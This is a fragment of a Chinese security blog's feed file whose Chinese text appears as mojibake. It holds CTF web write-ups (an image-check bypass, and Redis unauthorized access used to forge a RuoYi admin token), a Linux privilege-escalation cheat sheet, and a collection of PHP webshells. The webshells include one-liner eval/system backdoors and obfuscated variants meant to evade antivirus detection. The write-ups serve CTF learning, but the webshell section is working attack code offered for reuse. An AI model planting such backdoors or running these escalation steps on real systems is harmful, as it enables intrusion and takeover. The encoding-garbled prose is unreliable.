class="subst">$pos_for_zip</span>/*&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_dir(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$first</span> = imagecreatefrompng(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$size</span> = min(imagesx(<span class="variable">$first</span>), imagesy(<span class="variable">$first</span>));</span><br><span class="line">        <span class="variable">$second</span> = imagecrop(<span class="variable">$first</span>, [<span class="string">&#x27;x&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;y&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;width&#x27;</span> =&gt; <span class="variable">$size</span>, <span class="string">&#x27;height&#x27;</span> =&gt; <span class="variable">$size</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$second</span> !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="variable">$final_name</span> = pathinfo(<span class="variable">$file</span>)[<span class="string">&quot;basename&quot;</span>];</span><br><span class="line">            imagepng(<span class="variable">$second</span>, <span class="string">&#x27;example/&#x27;</span>.<span class="variable">$final_name</span>);</span><br><span class="line">            imagedestroy(<span class="variable">$second</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy(<span class="variable">$first</span>);</span><br><span class="line">        unlink(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç”¨è¿™ä¸ªè¿‡ getimagesizeï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define width 1</span><br><span class="line">#define height 1</span><br></pre></td></tr></table></figure><p>ç”¨ %C4%B0 é€šè¿‡ mb_strtolower urldecode ç»•è¿‡ i çš„è¿‡æ»¤ã€‚åˆ©ç”¨ <a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator/">https://github.com/huntergregal/PNG-IDAT-Payload-Generator/</a> ç»•è¿‡å›¾ç‰‡æ£€æŸ¥ã€‚</p><p>ä¿®æ”¹ä¸€ä¸‹è„šæœ¬ï¼Œå°† generate.py ä¸­çš„å€¼å–å‡ºæ¥ï¼š</p><p><img src="https://i.loli.net/2021/05/16/UQ64A82S5huXOWT.png"></p><p>ä¸¢åˆ° 010 é‡Œé¢æ”¹ä¸€ä¸‹ï¼š</p><p><img src="https://i.loli.net/2021/05/16/d7v28UgwFLkjrfO.png"></p><p>å†è½¬å›å»ï¼š</p><p><img src="https://i.loli.net/2021/05/16/IS7vtUhoXAELsBl.png"></p><p>æœ€åä¿®æ”¹è„šæœ¬é‡Œçš„å€¼ï¼Œç”Ÿæˆå›¾ç‰‡ğŸï¼š<code>python generate.py -m php -o a.png</code></p><p>ç„¶åå®Œäº‹äº†ï¼Œåé¢çš„è‡ªè¡Œè„‘è¡¥ã€‚</p><h2 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h2><p>Yii2 æ¡†æ¶é“¾å­ï¼Œä¸ä¼šï¼Œç­‰ guoke å’Œèµµæ€»å¸¦å¸¦äº†ã€‚</p><h2 id="babyblog"><a href="#babyblog" class="headerlink" title="babyblog"></a>babyblog</h2><p>/templates/ ä¸‹æºç æ³„éœ²ã€‚</p><h2 id="toktok"><a href="#toktok" class="headerlink" title="toktok"></a>toktok</h2><p>```<br>POST /admin<br>username=admin&amp;password=admin</p><p>è·å¾—ä¸€ä¸ª VPN çš„ apkï¼Œé€†å‘ï¼Ÿ</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_KCTF_WEB_WP</title>
      <link href="2021/05/14/2021-KCTF-WEB-WP/"/>
      <url>2021/05/14/2021-KCTF-WEB-WP/</url>
      
        <content type="html"><![CDATA[<h2 id="ç»Ÿä¸€é—¨æ´¾"><a href="#ç»Ÿä¸€é—¨æ´¾" class="headerlink" title="ç»Ÿä¸€é—¨æ´¾"></a>ç»Ÿä¸€é—¨æ´¾</h2><p>è‹¥ä¾å¼€æºå¿«é€Ÿå¼€å‘å¹³å°ï¼š<a href="https://gitee.com/y_project/RuoYi-Vue">https://gitee.com/y_project/RuoYi-Vue</a></p><ul><li>å‰ç«¯é‡‡ç”¨Vueã€Element UI</li><li>åç«¯é‡‡ç”¨Spring Bootã€Spring Securityã€Redis &amp; Jwt</li><li>æƒé™è®¤è¯ä½¿ç”¨Jwtï¼Œæ”¯æŒå¤šç»ˆç«¯è®¤è¯ç³»ç»Ÿ</li></ul><p>ç«¯å£å¼€æ”¾äº† Redis çš„ 6379ï¼Œå¯ä»¥è¿›è¡Œæœªæˆæƒè®¿é—®ï¼š</p><p><img src="https://i.loli.net/2021/05/14/QaUGoWvY5VECknF.png"></p><p><code>keys *</code> ä¼šå‘ç°å­˜åœ¨ä¸€ä¸ªç¼“å­˜äº†ç”¨æˆ·ç™»å½• token çš„ <code>login_tokens:3109ec3f-6e84-48f5-bc1f-4f351d236333</code>ï¼ˆå…¶å®ƒçš„éƒ½æ˜¯åˆ«çš„å¸ˆå‚…åœ¨æ‰“è¿™ä¸ªç¯å¢ƒçš„æ—¶å€™ç•™ä¸‹çš„ã€‚ã€‚ï¼‰ï¼Œå¯ä»¥ get ä¸€ä¸‹ï¼š<code>get &quot;login_tokens:3109ec3f-6e84-48f5-bc1f-4f351d236333&quot;</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.ruoyi.common.core.domain.model.LoginUser\&quot;,\&quot;accountNonExpired\&quot;:true,\&quot;accountNonLocked\&quot;:true,\&quot;browser\&quot;:\&quot;Chrome 9\&quot;,\&quot;credentialsNonExpired\&quot;:true,\&quot;enabled\&quot;:true,\&quot;expireTime\&quot;:1690354819542,\&quot;ipaddr\&quot;:\&quot;117.175.182.182\&quot;,\&quot;loginLocation\&quot;:\&quot;XX XX\&quot;,\&quot;loginTime\&quot;:1620354879542,\&quot;os\&quot;:\&quot;Windows 10\&quot;,\&quot;password\&quot;:\&quot;$2a$10$TbIq6QkLbP4MrjPaOJ2Y4.UqYYyChFC0HYrC7etAPI9iL1GOJ6ZLG\&quot;,\&quot;permissions\&quot;:Set[\&quot;*:*:*\&quot;],\&quot;token\&quot;:\&quot;07aaf192-ca8f-4db7-a6a2-ee81dbf07d58\&quot;,\&quot;user\&quot;:&#123;\&quot;admin\&quot;:true,\&quot;avatar\&quot;:\&quot;\&quot;,\&quot;createBy\&quot;:\&quot;admin\&quot;,\&quot;createTime\&quot;:1620186031000,\&quot;delFlag\&quot;:\&quot;0\&quot;,\&quot;dept\&quot;:&#123;\&quot;children\&quot;:[],\&quot;deptId\&quot;:103,\&quot;deptName\&quot;:\&quot;\xe7\xa0\x94\xe5\x8f\x91\xe9\x83\xa8\xe9\x97\xa8\&quot;,\&quot;leader\&quot;:\&quot;\xe8\x8b\xa5\xe4\xbe\x9d\&quot;,\&quot;orderNum\&quot;:\&quot;1\&quot;,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;parentId\&quot;:101,\&quot;status\&quot;:\&quot;0\&quot;&#125;,\&quot;deptId\&quot;:103,\&quot;email\&quot;:\&quot;ry@163.com\&quot;,\&quot;loginDate\&quot;:1620186031000,\&quot;loginIp\&quot;:\&quot;127.0.0.1\&quot;,\&quot;nickName\&quot;:\&quot;\xe8\x8b\xa5\xe4\xbe\x9d\&quot;,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;password\&quot;:\&quot;$2a$10$TbIq6QkLbP4MrjPaOJ2Y4.UqYYyChFC0HYrC7etAPI9iL1GOJ6ZLG\&quot;,\&quot;phonenumber\&quot;:\&quot;15888888888\&quot;,\&quot;remark\&quot;:\&quot;\xe7\xae\xa1\xe7\x90\x86\xe5\x91\x98\&quot;,\&quot;roles\&quot;:[&#123;\&quot;admin\&quot;:true,\&quot;dataScope\&quot;:\&quot;1\&quot;,\&quot;deptCheckStrictly\&quot;:false,\&quot;flag\&quot;:false,\&quot;menuCheckStrictly\&quot;:false,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;roleId\&quot;:1,\&quot;roleKey\&quot;:\&quot;admin\&quot;,\&quot;roleName\&quot;:\&quot;\xe8\xb6\x85\xe7\xba\xa7\xe7\xae\xa1\xe7\x90\x86\xe5\x91\x98\&quot;,\&quot;roleSort\&quot;:\&quot;1\&quot;,\&quot;status\&quot;:\&quot;0\&quot;&#125;],\&quot;sex\&quot;:\&quot;1\&quot;,\&quot;status\&quot;:\&quot;0\&quot;,\&quot;userId\&quot;:1,\&quot;userName\&quot;:\&quot;admin\&quot;&#125;,\&quot;username\&quot;:\&quot;admin\&quot;&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>çŒœæµ‹ JWT çš„å¯†é’¥ä¸ºé»˜è®¤å¯†é’¥ï¼Œå¯ä»¥ä¼ªé€  Admin-Token ç™»å½•ï¼Œç›´æ¥ä¸Šæ¼”ç¤ºåœ°å€è·å–ä¸€ä¸‹ï¼š<a href="http://vue.ruoyi.vip/index">http://vue.ruoyi.vip/index</a></p><p><img src="https://i.loli.net/2021/05/14/AO9EX5cQRCtDzrB.png"></p><p>Base64 è§£ç ä¸€ä¸‹å°±æœ‰ï¼š</p><p><img src="https://i.loli.net/2021/05/14/6kwOlC5eGRtbDhW.png"></p><p>ç„¶å set ä¸€ä¸ªæ–°çš„ login_tokensï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set login_tokens:f4c75427-0b4a-493c-9987-db9f8c9f4cda &quot;&#123;\&quot;@type\&quot;:\&quot;com.ruoyi.common.core.domain.model.LoginUser\&quot;,\&quot;accountNonExpired\&quot;:true,\&quot;accountNonLocked\&quot;:true,\&quot;browser\&quot;:\&quot;Chrome 9\&quot;,\&quot;credentialsNonExpired\&quot;:true,\&quot;enabled\&quot;:true,\&quot;expireTime\&quot;:1690354819542,\&quot;ipaddr\&quot;:\&quot;117.175.182.182\&quot;,\&quot;loginLocation\&quot;:\&quot;XX XX\&quot;,\&quot;loginTime\&quot;:1620354879542,\&quot;os\&quot;:\&quot;Windows 10\&quot;,\&quot;password\&quot;:\&quot;$2a$10$TbIq6QkLbP4MrjPaOJ2Y4.UqYYyChFC0HYrC7etAPI9iL1GOJ6ZLG\&quot;,\&quot;permissions\&quot;:Set[\&quot;*:*:*\&quot;],\&quot;token\&quot;:\&quot;07aaf192-ca8f-4db7-a6a2-ee81dbf07d58\&quot;,\&quot;user\&quot;:&#123;\&quot;admin\&quot;:true,\&quot;avatar\&quot;:\&quot;\&quot;,\&quot;createBy\&quot;:\&quot;admin\&quot;,\&quot;createTime\&quot;:1620186031000,\&quot;delFlag\&quot;:\&quot;0\&quot;,\&quot;dept\&quot;:&#123;\&quot;children\&quot;:[],\&quot;deptId\&quot;:103,\&quot;deptName\&quot;:\&quot;\xe7\xa0\x94\xe5\x8f\x91\xe9\x83\xa8\xe9\x97\xa8\&quot;,\&quot;leader\&quot;:\&quot;\xe8\x8b\xa5\xe4\xbe\x9d\&quot;,\&quot;orderNum\&quot;:\&quot;1\&quot;,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;parentId\&quot;:101,\&quot;status\&quot;:\&quot;0\&quot;&#125;,\&quot;deptId\&quot;:103,\&quot;email\&quot;:\&quot;ry@163.com\&quot;,\&quot;loginDate\&quot;:1620186031000,\&quot;loginIp\&quot;:\&quot;127.0.0.1\&quot;,\&quot;nickName\&quot;:\&quot;\xe8\x8b\xa5\xe4\xbe\x9d\&quot;,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;password\&quot;:\&quot;$2a$10$TbIq6QkLbP4MrjPaOJ2Y4.UqYYyChFC0HYrC7etAPI9iL1GOJ6ZLG\&quot;,\&quot;phonenumber\&quot;:\&quot;15888888888\&quot;,\&quot;remark\&quot;:\&quot;\xe7\xae\xa1\xe7\x90\x86\xe5\x91\x98\&quot;,\&quot;roles\&quot;:[&#123;\&quot;admin\&quot;:true,\&quot;dataScope\&quot;:\&quot;1\&quot;,\&quot;deptCheckStrictly\&quot;:false,\&quot;flag\&quot;:false,\&quot;menuCheckStrictly\&quot;:false,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;roleId\&quot;:1,\&quot;roleKey\&quot;:\&quot;admin\&quot;,\&quot;roleName\&quot;:\&quot;\xe8\xb6\x85\xe7\xba\xa7\xe7\xae\xa1\xe7\x90\x86\xe5\x91\x98\&quot;,\&quot;roleSort\&quot;:\&quot;1\&quot;,\&quot;status\&quot;:\&quot;0\&quot;&#125;],\&quot;sex\&quot;:\&quot;1\&quot;,\&quot;status\&quot;:\&quot;0\&quot;,\&quot;userId\&quot;:1,\&quot;userName\&quot;:\&quot;admin\&quot;&#125;,\&quot;username\&quot;:\&quot;admin\&quot;&#125;&quot;</span><br></pre></td></tr></table></figure><p>BP æ”¹ä¸€ä¸‹ responseï¼š</p><p><img src="https://i.loli.net/2021/05/14/me5PWivzr6MGcB9.png"></p><p>åŸæ¥çš„æ˜¯ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;msg&quot;</span>:<span class="string">&quot;ç”¨æˆ·ä¸å­˜åœ¨/å¯†ç é”™è¯¯&quot;</span>,<span class="attr">&quot;code&quot;</span>:<span class="number">500</span>&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥æ”¹ä¸ºï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;msg&quot;</span>:<span class="string">&quot;Du1 says nmsl&quot;</span>,<span class="attr">&quot;code&quot;</span>:<span class="number">200</span>,<span class="attr">&quot;token&quot;</span>:<span class="string">&quot;eyJhbGciOiJIUzUxMiJ9.eyJsb2dpbl91c2VyX2tleSI6ImY0Yzc1NDI3LTBiNGEtNDkzYy05OTg3LWRiOWY4YzlmNGNkYSJ9.2Cg8jbraYAmfFtUHCjoZYcXPnP33FfvR6ud8zrTJouC_qj3C3tq2CmV2x2scXMntgO3nKeMVMuVnc1E1pbgtMg&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/14/CtJroewEv4q5jLz.jpg"></p><p>è¿™é¢˜è¿˜æœ‰ä¸ªéé¢„æœŸï¼š</p><p><img src="https://i.loli.net/2021/05/14/tEbeKH2OdVCnomf.png"></p><p>ğŸ‘´ä¹Ÿæ˜¯å¾ˆå¼‚æˆ–å‘¢ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ææƒå§¿åŠ¿å°ç»“</title>
      <link href="2021/05/13/%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF%E5%B0%8F%E7%BB%93/"/>
      <url>2021/05/13/%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ææƒå¯èƒ½éœ€è¦åå¼¹ shellï¼Œå› ä¸ºè„šæœ¬è¯­è¨€æ— æ³•å½¢æˆç®¡é“ï¼Œéœ€è¦åˆ›é€ ä¸€ä¸ªç®¡é“æ‰èƒ½è¿›è¡Œåç»­çš„æ“ä½œï¼Œæ¯”å¦‚æº¢å‡ºæˆåŠŸä¹‹åè¿”å›ä¸€ä¸ª root æƒé™çš„ shellï¼Œè„šæœ¬è¯­è¨€æ‰§è¡Œå®Œå°±å®Œäº†ï¼Œä¸ä¼šè¿”å›ä¸€ä¸ªå¯ä»¥æ“ä½œçš„ root shellã€‚</p></blockquote><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="0x00-å¯†ç å¤ç”¨"><a href="#0x00-å¯†ç å¤ç”¨" class="headerlink" title="0x00 å¯†ç å¤ç”¨"></a>0x00 å¯†ç å¤ç”¨</h3><p>æ•°æ®åº“ rootï¼Œåå° web å¯†ç â€¦â€¦all may root pasword</p><h3 id="0x01-passwd-shadow"><a href="#0x01-passwd-shadow" class="headerlink" title="0x01  passwd / shadow"></a>0x01  passwd / shadow</h3><p>æ£€æµ‹ /etc/passwdã€/etc/shadow æ˜¯å¦å¯è¯»å¯å†™ï¼š</p><p><img src="https://i.loli.net/2021/05/13/hOvzJUqNI7PlLYB.png"></p><ul><li>passwd å¯å†™ï¼šå¯ä»¥å°†è‡ªå·±å½“å‰ç”¨æˆ·è®¾ç½®ä¸ºä¼ª rootï¼Œä¾‹å¦‚ <code>Du1:x:1001:1001</code>ï¼Œå°†å…¶æ¢ä¸º <code>Du1:x:0:0</code></li><li>shadow å¯è¯»ï¼šç›´æ¥å°†å…¶ root çš„ hash å¤åˆ¶å‡ºæ¥ï¼Œçˆ†ç ´</li></ul><h3 id="0x02-sudo"><a href="#0x02-sudo" class="headerlink" title="0x02 sudo"></a>0x02 sudo</h3><p>sudo å¤§å®¶ç»å¸¸é‡åˆ°ï¼Œæ¯”å¦‚æ‰§è¡Œæƒé™ä¸å¤Ÿæ—¶åŠ  sudo æ‰§è¡Œï¼Œsudo æ˜¯è®©æ™®é€šç”¨æˆ·ä½¿ç”¨è¶…çº§ç”¨æˆ·çš„å‘½ä»¤ã€‚å…¶é…ç½®æ–‡ä»¶ä¸º /etc/sudoersï¼Œæ–‡ä»¶å®šä¹‰å¯ä»¥æ‰§è¡Œ sudo çš„è´¦æˆ·ã€å®šä¹‰æŸä¸ªåº”ç”¨ç¨‹åºç”¨ root è®¿é—®ã€æ˜¯å¦éœ€è¦å¯†ç éªŒè¯ã€‚</p><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/13/81TBora6WV4ZuzU.png"></p><h4 id="bin-cp"><a href="#bin-cp" class="headerlink" title="/bin/cp"></a>/bin/cp</h4><p>å¦‚æœå¯ä»¥ä»¥ guess1 èº«ä»½æ‰§è¡Œ cpï¼Œè€Œæ­¤æ—¶æˆ‘ä»¬çš„ç”¨æˆ·ä¸º guess2ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å†™å…¥ guess1 çš„ authorized_keys æ¥åŒ…å« guess2 çš„å…¬é’¥ï¼Œä»è€Œç›´æ¥ç”¨ guess2 çš„ id_rsa å…å¯† ssh ç™»å½• guess1ï¼Œå› ä¸º guess1 æ²¡æœ‰æƒé™è®¿é—® guess2ï¼Œè€Œ guess2 ä¹Ÿäº¦ç„¶ï¼Œæ‰€ä»¥å…ˆä¸¢åˆ° /tmpï¼Œå†è½¬ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp ~/.ssh/id_rsa.pub /tmp/authorized_keys</span><br><span class="line">chmod 777 /tmp/authorized_keys</span><br><span class="line">sudo -u guess1 /bin/cp /tmp/authorized_keys /home/jen/.ssh/</span><br><span class="line">ssh -i id_rsa guess1@127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/14/dbGzqjw1trkXy3s.jpg"></p><h2 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h2><h3 id="è·å–äº¤äº’å¼-shell"><a href="#è·å–äº¤äº’å¼-shell" class="headerlink" title="è·å–äº¤äº’å¼ shell"></a>è·å–äº¤äº’å¼ shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">python2 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ™ºæ…§çš„æ”¶è— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è‚¾é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ğŸ‘´çš„å…»é©¬åœº</title>
      <link href="2021/05/11/%F0%9F%91%B4%E7%9A%84%E5%85%BB%E9%A9%AC%E5%9C%BA/"/>
      <url>2021/05/11/%F0%9F%91%B4%E7%9A%84%E5%85%BB%E9%A9%AC%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/05/12/BoeflE1bw7ihPW8.jpg"></p><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="ç®€å•ä¸€å¥è¯"><a href="#ç®€å•ä¸€å¥è¯" class="headerlink" title="ç®€å•ä¸€å¥è¯"></a>ç®€å•ä¸€å¥è¯</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;Du1&quot;</span>]);phpinfo(); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @system(<span class="variable">$_GET</span>[<span class="string">&quot;Du1&quot;</span>]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> usort(<span class="variable">$_GET</span>,<span class="string">&#x27;asse&#x27;</span>.<span class="string">&#x27;rt&#x27;</span>);<span class="meta">?&gt;</span>  <span class="comment">// ?1=1+1&amp;2=eval($_POST[x])</span></span><br></pre></td></tr></table></figure><h3 id="å…æ€"><a href="#å…æ€" class="headerlink" title="å…æ€"></a>å…æ€</h3><h4 id="ç®€å•å…æ€"><a href="#ç®€å•å…æ€" class="headerlink" title="ç®€å•å…æ€"></a>ç®€å•å…æ€</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$GLOBALS</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;_POST&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span><span class="comment">/**nice**/</span>(<span class="string">&#x27;&#x27;</span>. <span class="variable">$a</span>[<span class="variable">$str</span>][<span class="string">&#x27;cf87efe0c36a12aec113cd7982043573&#x27;</span>]. <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = str_replace(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;absbsbebrbt&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Du1&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="variable">$_POST</span>[<span class="string">&#x27;Du1&#x27;</span>];&#125;</span><br><span class="line">@preg_replace(<span class="string">&quot;/test/e&quot;</span>, fun(), <span class="string">&quot;testtesttest&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;t&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;_GET&#x27;</span>;</span><br><span class="line">(<span class="variable">$a</span>[<span class="number">0</span>].<span class="variable">$a</span>[<span class="number">1</span>].<span class="variable">$a</span>[<span class="number">1</span>].<span class="variable">$a</span>[<span class="number">2</span>].<span class="variable">$a</span>[<span class="number">3</span>].<span class="variable">$a</span>[<span class="number">4</span>])(<span class="variable">$$b</span>[<span class="string">&#x27;Du1&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = substr_replace(<span class="string">&quot;assexx&quot;</span>,<span class="string">&quot;rt&quot;</span>,<span class="number">4</span>);</span><br><span class="line"><span class="variable">$b</span>=[<span class="string">&#x27;&#x27;</span>=&gt;<span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Du1&#x27;</span>])];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="å¼‚æˆ–"><a href="#å¼‚æˆ–" class="headerlink" title="å¼‚æˆ–"></a>å¼‚æˆ–</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span> = (<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;\&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;4&#x27;</span>^<span class="string">&#x27;`&#x27;</span>);<span class="variable">$___</span> = <span class="variable">$$__</span>;@<span class="keyword">eval</span>(<span class="variable">$___</span>[<span class="string">&#x27;_&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="å¼‚æˆ–è½¬ç æ•°æ®"><a href="#å¼‚æˆ–è½¬ç æ•°æ®" class="headerlink" title="å¼‚æˆ–è½¬ç æ•°æ®"></a>å¼‚æˆ–è½¬ç æ•°æ®</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = (<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span 